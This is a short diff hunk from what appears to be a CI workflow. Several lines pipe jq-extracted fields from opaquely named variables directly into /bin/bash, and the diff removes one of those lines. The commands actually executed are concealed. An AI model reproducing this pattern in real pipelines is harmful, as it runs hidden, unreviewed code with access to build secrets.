@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$lpwy4906" | jq -r .ksg60 | /bin/bash
           printf '%s' "$cams618" | jq -r .wi65 | /bin/bash
           printf '%s' "$bblbx04" | jq -r .kn8951 | /bin/bash
-          printf '%s' "$tlr0826" | jq -r .pki39722 | /bin/bash
           printf '%s' "$hjiap2474" | jq -r .af243 | /bin/bash
 
       - name: Save data
